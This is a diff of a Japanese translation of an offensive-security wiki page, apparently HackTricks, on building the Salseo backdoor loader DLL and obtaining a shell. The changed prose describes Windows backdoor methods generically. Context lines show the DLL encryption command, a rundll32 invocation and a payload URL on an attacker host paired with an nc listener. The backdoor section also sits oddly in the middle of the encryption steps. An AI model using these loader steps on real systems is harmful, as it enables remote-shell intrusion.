@@ -39,29 +39,25 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-Windowsは、バックドアを作成するためのさまざまな方法を提供しています。以下にいくつかの一般的な手法を紹介します。
+Windows（ウィンドウズ）は、マイクロソフトが開発したオペレーティングシステムです。Windowsには、バックドアを作成するためのさまざまな方法があります。以下にいくつかの一般的な方法を紹介します。
 
 #### リモートデスクトップ
 
-リモートデスクトップ（RDP）は、Windowsマシンにリモートでアクセスするための機能です。バックドアを作成するために、攻撃者はRDPを利用してWindowsマシンにアクセスし、システムに対する制御を取得します。
+リモートデスクトップは、Windowsの標準機能であり、リモートでコンピュータにアクセスするためのプロトコルです。バックドアを作成するためには、リモートデスクトップを有効にし、適切な認証情報を使用してアクセスする必要があります。
 
-#### サービス
+#### バックドアソフトウェア
 
-Windowsでは、バックドアを作成するためにサービスを利用することができます。攻撃者は、システムにバックドアをインストールし、サービスとして実行することで、システムに持続的なアクセスを確保します。
+バックドアソフトウェアは、Windowsにインストールされたプログラムやツールです。これらのソフトウェアは、システムにバックドアを作成し、リモートでアクセスするための機能を提供します。バックドアソフトウェアは、悪意のある攻撃者によってインストールされることもあります。
 
-#### スケジュールされたタスク
+#### サービスの改ざん
 
-Windowsのスケジュールされたタスク機能を利用することで、バックドアを作成することができます。攻撃者は、タスクスケジューラを使用して、定期的にバックドアを実行するように設定します。
+Windowsでは、サービスと呼ばれるバックグラウンドプロセスが実行されます。これらのサービスを改ざんすることで、バックドアを作成することができます。改ざんされたサービスは、システムの起動時に自動的に実行され、攻撃者によるリモートアクセスを可能にします。
 
-#### レジストリ
+#### レジストリの変更
 
-Windowsのレジストリは、バックドアを作成するための重要な要素です。攻撃者は、レジストリを変更することで、システムの設定や動作を操作し、バックドアを作成します。
+Windowsのレジストリは、システムの設定情報を格納するデータベースです。レジストリを変更することで、バックドアを作成することができます。レジストリの変更は、システムの安定性に影響を与える可能性があるため、注意が必要です。
 
-#### ファイルシステム
-
-Windowsのファイルシステムを利用することで、バックドアを作成することができます。攻撃者は、システムのファイルやディレクトリを操作し、バックドアを配置します。
-
-これらは、Windowsでバックドアを作成するための一般的な手法の一部です。攻撃者は、これらの手法を組み合わせたり、他の手法を使用したりすることで、より高度な攻撃を行うことができます。
+これらは、Windowsでバックドアを作成するための一般的な方法の一部です。攻撃者は、これらの方法を使用してシステムに侵入し、機密情報を盗むなどの悪意のある行為を行うことがあります。セキュリティを強化するためには、適切な対策を講じる必要があります。
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -115,7 +111,7 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ### メイン関数の前に\[DllExport]を追加します
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### このプロジェクトにDllExportをインストールします
 
@@ -127,7 +123,7 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
 
-プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます
+プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます。
 
 ### DllExportをアンインストールします
 
@@ -161,7 +157,7 @@ Visual Studioを**終了**します
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-ソリューションを**ビルド**するには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）
+ソリューションをビルドするには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）
 
 ### 生成されたDLLをテストします
 
@@ -175,7 +171,7 @@ rundll32.exe SalseoLoader.dll,main
 
 ## DLLを使用してシェルを取得する
 
-**HTTPサーバー**を使用し、**ncリスナー**を設定することを忘れないでください。
+**HTTPサーバー**を使用して、**ncリスナー**を設定することを忘れないでください。
 
 ### Powershell
 ```
@@ -188,23 +184,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
-
-CMD provides a wide range of commands that can be used to carry out different operations. Some commonly used commands include:
-
-- `cd`: Change directory
-- `dir`: List files and directories
-- `mkdir`: Create a new directory
-- `del`: Delete files
-- `copy`: Copy files
-- `move`: Move files
-- `ren`: Rename files
-- `tasklist`: List running processes
-- `taskkill`: Terminate a running process
-
-CMD can also be used to execute batch scripts, which are a series of commands stored in a text file with the extension `.bat` or `.cmd`. Batch scripts allow users to automate repetitive tasks by running multiple commands sequentially.
-
-Overall, CMD is a powerful tool for managing and controlling the Windows operating system through the command line interface.
+CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a way to interact with the system through text-based commands. CMD can be used to execute various commands, navigate through directories, run scripts, and perform administrative tasks. It is a powerful tool for both regular users and hackers, as it allows for direct control and manipulation of the system.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
